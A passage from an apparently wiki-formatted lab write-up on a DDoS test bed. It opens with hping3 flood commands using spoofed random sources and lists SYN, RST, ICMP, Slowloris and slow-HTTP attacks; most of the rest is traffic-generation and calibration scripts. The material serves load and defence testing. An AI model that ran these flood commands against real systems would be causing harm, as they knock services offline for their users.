          hping3 $tarip -P -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## ICMP TYPES
          hping3 $tarip --icmp --flood -I eth1 --rand-source -C 5 &
          hping3 $tarip --icmp --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
      done
done
}}}

=== Creating The Combined List ===

{{{
root@The-SWARM:~# cat /usr/bin/list
#! /bin/bash
echo
echo "##### ATTACKS CONFIGURED:"
echo
echo "Layer-4 DOS Attacks:"
echo "--------------------"
echo "ATTACK-1  : SYN flood"
echo "ATTACK-2  : SYN-ACK flood"
echo "ATTACK-3  : Random (but identical across packet) payload (20 bytes payload)"
echo "ATTACK-4  : RST flood"
echo "ATTACK-5  : Synonymous payload (20 bytes payload) with spoofed source of victim itself"
echo "ATTACK-6  : SSH Brute Force"
echo "ATTACK-7  : Random (but identical across packet) UDP payload (20 bytes payload)"
echo "ATTACK-8  : Fragmentation Random Payload - UDP PAYLOAD"
echo "ATTACK-9  : DNS Payload to DNS port flood"
echo "ATTACK-10 : ICMP code-5 FLOOD"
echo "ATTACK-11 : ICMP code-5 FRAG FLOOD"
echo "ATTACK-12 : ICMP code-8 FLOOD"
echo
echo "Layer-7 DOS Attacks:"
echo "--------------------"
echo "ATTACK-13 : SLOW-LORIS HTTP ATTACK"
echo "ATTACK-14 : SLOW-POST HTTP ATTACK"
echo "ATTACK-15 : SLOW-READ HTTP ATTACK"
echo
echo "Custom Built DOS Attacks:"
echo "--------------------"
echo "ATTACK-20 : CHRISTMAS ATTACK"
echo
echo "ATTACk-CHECK : Check current Running Attacks"
echo "ATTACK-STOP  : Stop All Active Attacks"
echo
}}}

=== Creating The show Stopper ===

- Attack Triggers to check & Stop Current Attacks

==== Attack Check ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-CHECK 
#! /bin/bash

ps aux | grep -i hping3
ps aux | grep -i slowloris.pl
ps aux | grep -i slowhttptest
}}}

==== Attack Stop ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-STOP 
#! /bin/bash

pkill hping3
pkill hping3
pkill hping3
pkill hping3

pkill slowloris.pl
pkill slowloris.pl
pkill slowloris.pl
pkill slowloris.pl

pkill slowhttptest
pkill slowhttptest
pkill slowhttptest
pkill slowhttptest
}}}
-----

= The Client =

{{attachment:client.jpg}}

- The Client is the System which is going to Generate & Request Legitimate traffic back & Forth in correspondence with the victim.

== System Specifications ==

- The Client Server held the following Specs:

OS: Debian 8.1 (Jessie)

CPU: 4xCore

RAM: 4GB

Swap: 8GB

Disk: 500GB

== Preparing The Server ==

1- First Comes the network configuration, which includes Mang. Iface and the Data Traffic Iface

2- I have Created 250 Different Loopback Ifaces in order to simulate legitimate traffic from 250 different sources.

{{{
source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
allow-hotplug eth0
iface eth0 inet static
         address 192.168.0.131
         netmask 255.255.255.0
#        gateway 192.168.0.1
         network 192.168.0.0
         broadcast 192.168.0.255
         dns-nameservers 192.168.0.4


allow-hotplug eth1
iface eth1 inet static
        address 172.4.1.2
        netmask 255.255.255.252
        gateway 172.4.1.1
        network 172.4.1.0
        broadcast 172.4.1.3


# STATIC-ROUTES
up route add -net 192.168.0.0/16 gw 192.168.0.1 dev eth0
up route add -net 10.172.99.0/24 gw 192.168.0.1 dev eth0

##########################  LEGIT IFACES
# LOOPBACKS
auto lo lo:1 lo:2 lo:3 lo:4 lo:5 lo:6 lo:7 lo:8 lo:9 lo:10 lo:11 lo:12 lo:13 lo:14 lo:15 lo:16 lo:17 lo:18 lo:19 lo:20 lo:21 lo:22 lo:23 lo:24 lo:25 lo:26 lo:27 lo:28 lo:29 lo:30 lo:31 lo:3
2 lo:33 lo:34 lo:35 lo:36 lo:37 lo:38 lo:39 lo:40 lo:41 lo:42 lo:43 lo:44 lo:45 lo:46 lo:47 lo:48 lo:49 lo:50 lo:51 lo:52 lo:53 lo:54 lo:55 lo:56 lo:57 lo:58 lo:59 lo:60 lo:61 lo:62 lo:63 l
o:64 lo:65 lo:66 lo:67 lo:68 lo:69 lo:70 lo:71 lo:72 lo:73 lo:74 lo:75 lo:76 lo:77 lo:78 lo:79 lo:80 lo:81 lo:82 lo:83 lo:84 lo:85 lo:86 lo:87 lo:88 lo:89 lo:90 lo:91 lo:92 lo:93 lo:94 lo:9
5 lo:96 lo:97 lo:98 lo:99 lo:100 lo:101 lo:102 lo:103 lo:104 lo:105 lo:106 lo:107 lo:108 lo:109 lo:110 lo:111 lo:112 lo:113 lo:114 lo:115 lo:116 lo:117 lo:118 lo:119 lo:120 lo:121 lo:122 lo
:123 lo:124 lo:125 lo:126 lo:127 lo:128 lo:129 lo:130 lo:131 lo:132 lo:133 lo:134 lo:135 lo:136 lo:137 lo:138 lo:139 lo:140 lo:141 lo:142 lo:143 lo:144 lo:145 lo:146 lo:147 lo:148 lo:149 lo
:150 lo:151 lo:152 lo:153 lo:154 lo:155 lo:156 lo:157 lo:158 lo:159 lo:160 lo:161 lo:162 lo:163 lo:164 lo:165 lo:166 lo:167 lo:168 lo:169 lo:170 lo:171 lo:172 lo:173 lo:174 lo:175 lo:176 lo
:177 lo:178 lo:179 lo:180 lo:181 lo:182 lo:183 lo:184 lo:185 lo:186 lo:187 lo:188 lo:189 lo:190 lo:191 lo:192 lo:193 lo:194 lo:195 lo:196 lo:197 lo:198 lo:199 lo:200 lo:201 lo:202 lo:203 lo
:204 lo:205 lo:206 lo:207 lo:208 lo:209 lo:210 lo:211 lo:212 lo:213 lo:214 lo:215 lo:216 lo:217 lo:218 lo:219 lo:220 lo:221 lo:222 lo:223 lo:224 lo:225 lo:226 lo:227 lo:228 lo:229 lo:230 lo
:231 lo:232 lo:233 lo:234 lo:235 lo:236 lo:237 lo:238 lo:239 lo:240 lo:241 lo:242 lo:243 lo:244 lo:245 lo:246 lo:247 lo:248 lo:249 lo:250
iface lo inet loopback

iface lo:1 inet static
        address 30.30.1.1
        netmask 255.255.255.0

iface lo:2 inet static
        address 30.30.2.1
        netmask 255.255.255.0

iface lo:3 inet static
        address 30.30.3.1
        netmask 255.255.255.0

....

iface lo:243 inet static
        address 30.30.243.1
        netmask 255.255.255.0

iface lo:244 inet static
        address 30.30.244.1
        netmask 255.255.255.0

iface lo:245 inet static
        address 30.30.245.1
        netmask 255.255.255.0

iface lo:246 inet static
        address 30.30.246.1
        netmask 255.255.255.0

iface lo:247 inet static
        address 30.30.247.1
        netmask 255.255.255.0

iface lo:248 inet static
        address 30.30.248.1
        netmask 255.255.255.0

iface lo:249 inet static
        address 30.30.249.1
        netmask 255.255.255.0

iface lo:250 inet static
        address 30.30.250.1
        netmask 255.255.255.0
}}} 

== Legitimate Traffic Generation ==

- In order to Generate Simultaneous Legitimate Services with Fluctuating bandwidth, the following has been created and used.

=== Legitimate HTTP ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat start-http
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
many=250
echo
touch /root/shockWave/LEGIT/temp-cluster/temp-http-300
echo "Cleaning HTTP Temp Cluster...[OK]"
rm -r /root/shockWave/LEGIT/temp-cluster/temp-http-*
echo

while true
do
check=$(ps aux | grep -i wget | grep -i "http:" | head -1 | grep -o "limit")
if [ -z "$check" ]
then
    for i in `seq 1 $many`;
    do
       mkdir /root/shockWave/LEGIT/temp-cluster/temp-http-$i > /dev/null 2>&1
       cd /root/shockWave/LEGIT/temp-cluster/temp-http-$i
       echo -en "                   ## Deploying HTTP Client $i/$many" \\r
       wget --bind-address=30.30.$i.1 --limit-rate=10K -r -p -l 2 -T 60 --random-wait --user-agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3" --convert-links http://10.10.10.2/ > /dev/null 2>&1 &
       sleep 0.1
    done
else
    echo "                   Waiting for Active Clients..."
fi
sleep 1
done


# --bind-address=ADDRESS    bind to ADDRESS (hostname or IP) on local host.
# --limit-rate=RATE         limit download rate to RATE.
# -p,  --page-requisites    get all images, etc. needed to display HTML page.
# -r,  --recursive          specify recursive download.
# -l,  --level=NUMBER       maximum recursion depth (inf or 0 for infinite).
# -T,  --timeout=SECONDS    set all timeout values to SECONDS.
# --random-wait             wait from 0.5*WAIT...1.5*WAIT secs between retrievals.
# --user-agent=AGENT        identify as AGENT instead of Wget/VERSION.
# --convert-links           make links in downloaded HTML or CSS point to local files.
}}} 

=== Legitimate HTTPS ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat start-https
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
many=250
echo
touch /root/shockWave/LEGIT/temp-cluster/temp-httpS-300
echo "Cleaning HTTPS Temp Cluster...[OK]"
rm -r /root/shockWave/LEGIT/temp-cluster/temp-httpS-*


while true
do
check=$(ps aux | grep -i wget | grep -i "https:" | head -1 | grep -o "limit")
if [ -z "$check" ]
then
    for i in `seq 1 $many`;
    do
       mkdir /root/shockWave/LEGIT/temp-cluster/temp-httpS-$i > /dev/null 2>&1
       cd /root/shockWave/LEGIT/temp-cluster/temp-httpS-$i
       echo -en "                                                        ## Deploying HTTPS Client $i/$many" \\r
       wget --bind-address=30.30.$i.1 --limit-rate=10K -r -p -l 2 -T 60 --no-check-certificate --random-wait --user-agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3" --convert-links https://10.10.10.2/  > /dev/null 2>&1 &
       sleep 0.1
    done
else
    echo "                                                        Waiting for Active Clients..."
fi
sleep 1
done


# --bind-address=ADDRESS    bind to ADDRESS (hostname or IP) on local host.
# --limit-rate=RATE         limit download rate to RATE.
# -p,  --page-requisites    get all images, etc. needed to display HTML page.
# -r,  --recursive          specify recursive download.
# -l,  --level=NUMBER       maximum recursion depth (inf or 0 for infinite).
# -T,  --timeout=SECONDS    set all timeout values to SECONDS.
# --random-wait             wait from 0.5*WAIT...1.5*WAIT secs between retrievals.
# --user-agent=AGENT        identify as AGENT instead of Wget/VERSION.
# --convert-links           make links in downloaded HTML or CSS point to local files.
}}}

=== Legitimate FTP ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat start-ftp 
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
rm -r /root/shockWave/LEGIT/temp-cluster/FTP > /dev/null 2>&1
mkdir /root/shockWave/LEGIT/temp-cluster/FTP > /dev/null 2>&1
cd /root/shockWave/LEGIT/temp-cluster/FTP
sleep 1
n=1
many=250
while true
do
    for i in `seq 1 $many`;
    do
       echo "-> FTP GET Count $n"
       wget --bind-address=30.30.$i.1 ftp://core:core@10.10.10.2/ftp-files/test1m > /dev/null 2>&1
       sleep 0.5
       let n=n+1
    done
done
}}}

=== Legitimate SMTP ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat start-smtp 
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cd /root/shockWave/LEGIT/temp-cluster
rm ps aux > /dev/null 2>&1
(mkfifo /var/spool/postfix/public/pickup ps aux | grep mail kill sudo /etc/init.d/postfix restart) > /dev/null 2>&1
service postfix restart > /dev/null 2>&1
sleep 1

n=1
postsuper -d ALL deferred
postsuper -d ALL
while true
do
    echo "-> MAILS SENT: $n"
    echo "BLA BLA BLA BLA BLA BLA BLA BLA BLA" | mail -s "TEST SUBJECT" -a "From: you@example.com" test@victim.com
    sleep 0.5
    let n=n+1
done
}}}

=== Legitimate DNS ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat start-dns 
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cd /root/shockWave/LEGIT/temp-cluster
sleep 1
n=1
many=250
while true
do
    for i in `seq 1 $many`;
    do
       echo "-> DNS RUN $n"
       dig -b 30.30.$i.1 @10.10.10.2 core.myhome.net > /dev/null 2>&1
       dig -b 30.30.$i.1 @10.10.10.2 gw.myhome.net > /dev/null 2>&1
       dig -b 30.30.$i.1 @10.10.10.2 control.myhome.net > /dev/null 2>&1
       dig -b 30.30.$i.1 @10.10.10.2 ns.myhome.net > /dev/null 2>&1
       dig -b 30.30.$i.1 @10.10.10.2 dns.myhome.net > /dev/null 2>&1
       dig -b 30.30.$i.1 @10.10.10.2 media.myhome.net > /dev/null 2>&1
       dig -b 30.30.$i.1 @10.10.10.2 lb.myhome.net > /dev/null 2>&1
       sleep 0.5
       let n=n+1
    done
done
}}}

=== Legitimate ICMP ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat start-ping 
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cd /root/shockWave/LEGIT/temp-cluster
sleep 1
n=1
many=250
while true
do
    for i in `seq 1 $many`;
    do
       echo -en "                                                                                            ## Ping Count $n" \\r
       ping -c 1 -I 30.30.$i.1 10.10.10.2 > /dev/null 2>&1
       sleep 0.1
       let n=n+1
    done
done
}}}

== Legitimate Traffic Spool up ==

=== Legitimate Mix Start ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat START-MIX 
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cd /root/shockWave/LEGIT/temp-cluster

/root/shockWave/LEGIT/start-http &
/root/shockWave/LEGIT/start-https &
/root/shockWave/LEGIT/start-smtp &
/root/shockWave/LEGIT/start-dns &
/root/shockWave/LEGIT/start-ping &
/root/shockWave/LEGIT/start-ftp &
}}}

=== Legitimate Mix Stop ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat KILL-MIX 
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

#KILL LOOP ITSELF IF NEEDED
#pkill loop-for-ram && pkill loop-for-ram && pkill loop-for-ram && pkill loop-for-ram && pkill loop-for-ram

pkill start-http && pkill start-http && pkill start-http && pkill start-http && pkill start-http && pkill start-http

pkill start-https && pkill start-https && pkill start-https && pkill start-https && pkill start-https && pkill start-https

pkill start-smtp && pkill start-smtp && pkill start-smtp && pkill start-smtp && pkill start-smtp && pkill start-smtp

pkill start-dns && pkill start-dns && pkill start-dns && pkill start-dns && pkill start-dns && pkill start-dns

pkill start-ping && pkill start-ping && pkill start-ping && pkill start-ping && pkill start-ping && pkill start-ping

pkill start-ftp && pkill start-ftp && pkill start-ftp && pkill start-ftp && pkill start-ftp && pkill start-ftp

pkill wget && pkill wget && pkill wget && pkill wget && pkill wget && pkill wget

pkill nslookup && pkill nslookup && pkill nslookup && pkill nslookup && pkill nslookup && pkill nslookup

pkill ping && pkill ping && pkill ping && pkill ping && pkill ping && pkill ping

swapoff -a && swapon -a
}}}

=== Legitimate Continuous Loop ===

{{{
root@DDOS-Client:~/shockWave/LEGIT# cat loop-for-ram 
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/LEGIT/temp-cluster

while true
do
    /root/shockWave/LEGIT/START-MIX &
    sleep 300
    /root/shockWave/LEGIT/KILL-MIX
done
}}}

-----

= Calibration Setup =

{{attachment:Calib.jpg}}

- In order to Calibrate the performance & response times of the victim, Calibration tools has been built on the Client.

- The Calibration uses 10 Different Clients in Data collection each sourced from unique IP.

== Calibration Mechanism ==

- Tools & Scripts that I used & Created for Calibrating the Server Performance

=== Calibrate HTTP ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat calib-http
#! /bin/bash

#TIMES OUT AT MAX 25 SECONDS

calibT="http://192.168.0.66/"

for i in {1..10}
do
  siege -c 1000 -r 1 $calibT > /root/shockWave/Calibration/temp-cluster/http-$i.calib 2>&1
  client=$(cat /root/shockWave/Calibration/temp-cluster/http-$i.calib | grep -i "Transaction rate:" | awk '{print $3}')
  #value=$(echo $client*1000 | bc )
  value=$(echo $client)
  echo HTTP Client$i is $value Trans/sec

  echo $value > /root/shockWave/Calibration/DATA-POINTS/http/http-$i.DP
done
}}}

=== Calibrate HTTPS ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat calib-https 
#! /bin/bash

#TIMES OUT AT MAX 25 SECONDS

calibT="https://192.168.0.66/"

for i in {1..10}
do
  siege -c 1000 -r 1 $calibT > /root/shockWave/Calibration/temp-cluster/httpS-$i.calib 2>&1
  client=$(cat /root/shockWave/Calibration/temp-cluster/httpS-$i.calib | grep -i "Transaction rate:" | awk '{print $3}')
  #value=$(echo $client*1000 | bc )
  value=$(echo $client)
  echo HTTPS Client$i is $value Trans/sec
  echo $value > /root/shockWave/Calibration/DATA-POINTS/https/https-$i.DP
done
}}}

=== Calibrate FTP ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat calib-ftp
#! /bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cd /root/shockWave/Calibration/temp-cluster

calibT="192.168.0.66"
#calibS='30.30.$i.1'
calibS="192.168.0.131"

for i in {1..10}
do
  wget --bind-address=$calibS ftp://core:core@$calibT/ftp-files/test1m -O ftp-$i.file 2> /root/shockWave/Calibration/temp-cluster/ftp-$i.calib
  client=$(cat /root/shockWave/Calibration/temp-cluster/ftp-$i.calib | grep -i "100%" | awk '{print $4}' | cut -d "=" -f2 | cut -d "s" -f1)
  value=$(echo $client*1000 | bc )
  echo FTP Client$i is $value MilliSEC
  echo $value > /root/shockWave/Calibration/DATA-POINTS/ftp/ftp-$i.DP
done
}}}

=== Calibrate SMTP ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat calib-smtp 
#! /bin/bash

#TIMES OUT AT MAX 25 SECONDS

calibT="192.168.0.66:25"

for i in {1..10}
do
  { time smtp-source -s 40 -l 10120 -m 50 -c -f root@client.com -t root@victim.com $calibT ; } &> /root/shockWave/Calibration/temp-cluster/smtp-$i.calib
  client=$(cat /root/shockWave/Calibration/temp-cluster/smtp-$i.calib | grep -i "real" | awk '{print $2}' | cut -d "m" -f2 | cut -d "s" -f1)
  value=$(echo $client*1000 | bc )
  echo SMTP Client$i is $value MilliSEC
  echo $value > /root/shockWave/Calibration/DATA-POINTS/smtp/smtp-$i.DP
done
}}}

=== Calibrate DNS ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat calib-dns
#! /bin/bash

#TIMES OUT AT MAX 25 SECONDS

calibT="192.168.0.66"
#calibS='30.30.$i.1'
calibS="192.168.0.131"

for i in {1..10}
do
  dig -b $calibS @$calibT core.myhome.net    > /root/shockWave/Calibration/temp-cluster/dns1-$i.calib 2>&1
  dig -b $calibS @$calibT gw.myhome.net      > /root/shockWave/Calibration/temp-cluster/dns2-$i.calib 2>&1
  dig -b $calibS @$calibT control.myhome.net > /root/shockWave/Calibration/temp-cluster/dns3-$i.calib 2>&1
  dig -b $calibS @$calibT ns.myhome.net      > /root/shockWave/Calibration/temp-cluster/dns4-$i.calib 2>&1
  dig -b $calibS @$calibT dns.myhome.net     > /root/shockWave/Calibration/temp-cluster/dns5-$i.calib 2>&1
  dig -b $calibS @$calibT media.myhome.net   > /root/shockWave/Calibration/temp-cluster/dns6-$i.calib 2>&1
  dig -b $calibS @$calibT lb.myhome.net      > /root/shockWave/Calibration/temp-cluster/dns7-$i.calib 2>&1
  let value=0
  for j in {1..7}
  do
    client=$(cat /root/shockWave/Calibration/temp-cluster/dns$j-$i.calib | grep -i "Query time:" | awk '{print $4}')
    clres=$(echo $client)
    let value=value+$clres
  done
  echo DNS Client$i is $value MilliSEC
  echo $value > /root/shockWave/Calibration/DATA-POINTS/dns/dns-$i.DP
done
}}}

=== Calibrate ICMP ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat calib-ping 
#! /bin/bash

#TIMES OUT AT MAX 25 SECONDS

calibT="192.168.0.66"
#calibS="30.30.$i.1"
calibS="192.168.0.131"

for i in {1..10}
do
  ping -c 1 -I $calibS $calibT > /root/shockWave/Calibration/temp-cluster/ping-$i.calib 2>&1
  client=$(cat /root/shockWave/Calibration/temp-cluster/ping-$i.calib | grep -i "time=" | awk '{print $7}' | cut -d "=" -f2)
  value=$(echo $client*1000 | bc)
  echo ICMP Client$i is $value MicroSEC
  echo $value > /root/shockWave/Calibration/DATA-POINTS/icmp/icmp-$i.DP 
done
}}}

== Calibration Spool up ==

- To start Continuous calibration 

=== Calib-Start-Mix ===

{{{
root@DDOS-Client:~/shockWave/Calibration# cat CALIB-MIX 
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cd /root/shockWave/Calibration/temp-cluster

/root/shockWave/Calibration/calib-http &
/root/shockWave/Calibration/calib-https &
/root/shockWave/Calibration/calib-smtp &
/root/shockWave/Calibration/calib-dns &
/root/shockWave/Calibration/calib-ping &
/root/shockWave/Calibration/calib-ftp &
}}}

Then Cron it over whatever time period needed.

{{{
* * * * * /root/shockWave/Calibration/CALIB-MIX
}}}

== Data Points Collectors ==

- Create the Collectors which will retrieve the Data Points Values

- The following Script was used to create another '''''67''''' Scripts.

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat MAKE.CREATE 
#! /bin/bash


for i in {1..10}
do
echo "#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd icmp/
cat icmp-$i.DP

" > make-icmp-$i
done
}}}

=== HTTP Collector for Clients 1 through 10 ===

{{{
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd http/
cat http-1.DP
}}}

=== HTTPS Collector for Clients 1 through 10 ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-https-1
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd https/
cat https-1.DP
}}}

=== FTP Collector for Clients 1 through 10 ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-ftp-1
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd ftp/
cat ftp-1.DP
}}}

=== SMTP Collector for Clients 1 through 10 ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-smtp-1
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd smtp/
cat smtp-1.DP
}}}

=== DNS Collector for Clients 1 through 10 ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-dns-1
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd dns/
cat dns-1.DP
}}}

=== ICMP Collector for Clients 1 through 10 ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-icmp-1
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd icmp/
cat icmp-1.DP
}}}

== Average of Average Data Points ==

- To create the Average of Average Data-Points:

=== HTTP Average Data Point ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-http-AVG 
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd http/

AVG=$(echo "scale=2; 0.00" | bc -l)
for datapoint in *.DP
do
    val=$(cat $datapoint)
    AVG=$(echo "scale=2; $AVG + $val" | bc -l)
done
AVG=$(echo "scale=2; $AVG / 10" | bc )
echo $AVG
}}}

=== HTTPS Average Data Point ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-https-AVG 
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd https/

AVG=$(echo "scale=2; 0.00" | bc -l)
for datapoint in *.DP
do
    val=$(cat $datapoint)
    AVG=$(echo "scale=2; $AVG + $val" | bc -l)
done
AVG=$(echo "scale=2; $AVG / 10" | bc )
echo $AVG
}}}

=== FTP Average Data Point ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-ftp-AVG  
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd ftp/

AVG=$(echo "scale=2; 0.00" | bc -l)
for datapoint in *.DP
do
    val=$(cat $datapoint)
    AVG=$(echo "scale=2; $AVG + $val" | bc -l)
done
AVG=$(echo "scale=2; $AVG / 10" | bc )
echo $AVG
}}}

=== SMTP Average Data Point ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-smtp-AVG  
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd smtp/

AVG=$(echo "scale=2; 0.00" | bc -l)
for datapoint in *.DP
do
    val=$(cat $datapoint)
    AVG=$(echo "scale=2; $AVG + $val" | bc -l)
done
AVG=$(echo "scale=2; $AVG / 10" | bc )
echo $AVG
}}}

=== DNS Average Data Point ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-dns-AVG     
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd dns/

AVG=$(echo "scale=2; 0.00" | bc -l)
for datapoint in *.DP
do
    val=$(cat $datapoint)
    AVG=$(echo "scale=2; $AVG + $val" | bc -l)
done
AVG=$(echo "scale=2; $AVG / 10" | bc )
echo $AVG
}}}

=== ICMP Average Data Point ===

{{{
root@DDOS-Client:~/shockWave/Calibration/DATA-POINTS/BIN# cat make-icmp-AVG  
#! /bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /root/shockWave/Calibration/DATA-POINTS/

cd icmp/

AVG=$(echo "scale=2; 0.00" | bc -l)
for datapoint in *.DP
do
    val=$(cat $datapoint)
    AVG=$(echo "scale=2; $AVG + $val" | bc -l)
done
AVG=$(echo "scale=2; $AVG / 10" | bc )
echo $AVG
}}}

== SNMPD Link Data Points ==

- In order for all those collectors to be active in the SNMP query, we added them as execute upon query.

{{{
root@DDOS-Client:~/shockWave/Calibration# cat /etc/snmp/snmpd.conf
#  Listen for connections from the local system only
agentAddress  udp:127.0.0.1:161
#  Listen for connections on eth0 only
agentAddress  udp:192.168.0.131:161

## System location and contact information
syslocation NOOR
syscontact NOOR-SYSTEMS

rocommunity TeSt0FDd0S


### Calibration Extensions ###
##HTTP
extend .1.3.6.1.4.1.10001.1 http-calib1 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-1 
extend .1.3.6.1.4.1.10001.2 http-calib2 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-2 
extend .1.3.6.1.4.1.10001.3 http-calib3 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-3 
extend .1.3.6.1.4.1.10001.4 http-calib4 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-4 
extend .1.3.6.1.4.1.10001.5 http-calib5 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-5 
extend .1.3.6.1.4.1.10001.6 http-calib6 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-6 
extend .1.3.6.1.4.1.10001.7 http-calib7 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-7 
extend .1.3.6.1.4.1.10001.8 http-calib8 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-8 
extend .1.3.6.1.4.1.10001.9 http-calib9 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-9 
extend .1.3.6.1.4.1.10001.10 http-calib10 /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-10 
extend .1.3.6.1.4.1.10001.11 http-calibAVG /root/shockWave/Calibration/DATA-POINTS/BIN/make-http-AVG
##HTTPS
extend .1.3.6.1.4.1.10002.1 https-calib1 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-1 
extend .1.3.6.1.4.1.10002.2 https-calib2 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-2 
extend .1.3.6.1.4.1.10002.3 https-calib3 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-3 
extend .1.3.6.1.4.1.10002.4 https-calib4 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-4 
extend .1.3.6.1.4.1.10002.5 https-calib5 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-5 
